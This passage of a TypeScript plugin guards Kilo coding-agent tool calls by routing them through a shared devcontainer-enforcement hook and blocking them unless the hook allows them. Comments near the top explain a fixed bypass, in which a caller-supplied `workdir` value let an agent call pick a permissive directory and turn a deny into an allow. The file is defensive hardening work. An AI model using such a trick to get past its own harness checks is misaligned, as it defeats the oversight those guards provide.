      // i.e. adding one attacker-chosen string to a call turned a deny into an
      // allow. The deny-by-default work made the reach wider, too: it newly
      // routes `interactive_terminal` and `background_process` through this
      // same path, and `background_process`'s own shipped description says it
      // takes a `workdir`.
      //
      // Preferring `workdir` was not wrong in itself -- some bash-shaped calls
      // (observed on task-delegated subagent calls) genuinely carry a more
      // precise cwd for that specific call than the session-wide one. The bug
      // was preferring it INSTEAD OF the session directory rather than IN
      // ADDITION TO it. So both are submitted and both must come back clean.
      // That keeps the precision benefit for legitimate calls while removing
      // the caller's ability to select a permissive target: `sessionDirectory`
      // comes from `ctx.directory`, which the plugin host gives this plugin and
      // no tool call can influence, so there is always at least one judged
      // directory the caller did not choose.
      //
      // The alternative -- accept `workdir` only if it resolves inside the
      // session's project root -- was considered and rejected: it would put
      // path-containment logic (realpath, symlink resolution, prefix matching)
      // in this file, and this file is a THIN SHIM that must hold no
      // git/marker/container logic of its own (see the header). Judging both
      // needs no such logic and is strictly the safer of the two anyway.
      //
      // The Copilot port reaches the same guarantee by a different route,
      // which is the point of this PR: its payload has no per-call working
      // directory at all, so it judges the session cwd only, and it explicitly
      // refuses to speculate a `.workdir` read into existence
      // (copilot/hooks/require-devcontainer.sh, the bash branch). Same
      // guarantee -- "the caller cannot pick its own guard target" -- enforced
      // by whatever each CLI actually hands the shim.
      //
      // `workdir` is read as an OWN property for the same reason as the shape
      // keys -- see ownNonEmptyString -- so an inherited
      // `Object.prototype.workdir` cannot inject a target either.
      const workdir = ownNonEmptyString(args, "workdir")
      const targets: string[] = []
      if (typeof sessionDirectory === "string" && sessionDirectory !== "") targets.push(sessionDirectory)
      if (workdir !== undefined && workdir !== sessionDirectory) targets.push(workdir)

      // No usable directory at all means nothing to judge against, and the
      // shared guard's `[ -n "$target" ] || exit 0` would ALLOW on an empty
      // one. Deny instead, mirroring the Copilot port, which denies outright
      // when its payload carries no cwd ("the hook payload carried no cwd, so
      // the project this call targets could not be determined").
      if (targets.length === 0) {
        throw new Error(
          `BLOCKED by kilo/plugin/require-devcontainer.ts: the "${input.tool}" call could not be associated with any working directory -- the plugin host supplied no session directory and the call carried no non-empty string \`workdir\`. Refusing rather than allowing a call this guard has no project to judge it against. This is a bug in the hook or its host, not in your call -- report it to the Captain.`,
        )
      }

      const home = process.env.HOME || homedir()
      const script = `${home}/.claude/hooks/require-devcontainer.sh`

      // EVERY submission, against EVERY target directory, must come back
      // clean. For a name-mapped tool there is exactly one submission; for a
      // shape-probed call carrying both a path and a command there are two --
      // see the both-shapes note above for why neither shape may be dropped --
      // and for a call carrying its own `workdir` there are two targets, see
      // the issue #25 note above for why neither directory may be dropped. The
      // FIRST deny wins; the iteration order decides only which deny message
      // the caller sees, never whether the call proceeds.
      //
      // The cross product is deliberately allowed to be redundant rather than
      // cleverly pruned. An Edit submission that carries a real `file_path` is
      // judged on that path by the shared script and ignores the payload's
      // `cwd` entirely (require-devcontainer.sh derives `target` from
      // `tool_input.file_path` for file tools), so running it against a second
      // target repeats a check rather than adding one. Skipping that case
      // would mean this shim reasoning about which payload fields the shared
      // script consults -- exactly the kind of duplicated logic the header
      // forbids, and exactly what goes stale when the script changes. An extra
      // spawn of a fast script is the cheaper mistake.
      for (const submission of submissions) {
        for (const cwd of targets) {
          const payload =
            submission.toolName === "Bash"
              ? { tool_name: "Bash", agent_type: "kilo", cwd, tool_input: { command: submission.command } }
              : { tool_name: "Edit", agent_type: "kilo", cwd, tool_input: { file_path: submission.filePath } }

          const result = spawnSync("bash", [script], {
            input: JSON.stringify(payload),
            encoding: "utf8",
            timeout: 15_000,
            // Anchor the script's own process cwd to the directory this
            // iteration is judging. require-devcontainer.sh only reads `cwd`
            // from the JSON payload for Bash; for file tools it derives
            // `target` purely from `tool_input.file_path` and falls back to
            // "." when that's missing or empty (apply_patch, an
            // undocumented/renamed args field, a future tool this map doesn't
            // cover yet), at which point its `git -C "."` resolves against
            // *this* process's cwd. Without this, that would silently be
            // wherever the Kilo server itself was launched from -- not
            // necessarily the delegated call's actual target -- and the guard
            // could check the wrong project's container/exemption status.
            cwd,
          })

          // Fail closed on anything but a clean allow (status 0). A spawn
          // failure, a missing script, a timeout (status null + signal set),
          // or an exit code the script never documented are all treated as a
          // block rather than let through -- mirroring d53a8a9's hardening of
          // the sibling hooks. A guard that silently stops guarding because of
          // a shim-level bug is worse than one that over-blocks.
          if (result.error) {
            throw new Error(
              `BLOCKED by kilo/plugin/require-devcontainer.ts: failed to run ${script}: ${result.error.message}. Refusing rather than letting this call through with the guard unable to run.`,
            )
          }
          if (result.status === 2) {
            throw new Error((result.stderr || "").trim() || "BLOCKED by require-devcontainer.sh (no stderr captured)")
          }
          if (result.status !== 0) {
            throw new Error(
              `BLOCKED by kilo/plugin/require-devcontainer.ts: require-devcontainer.sh exited ${String(result.status)} (expected 0 or 2), signal=${String(result.signal)}. stderr: ${(result.stderr || "").trim()}. Refusing rather than letting this call through with the guard in an unexpected state.`,
            )
          }
        }
      }
      // Every submission, against every target directory, exited 0 -> allow.
      // Return normally.
    },
  }
}

export default { id: "require-devcontainer", server: RequireDevcontainer }
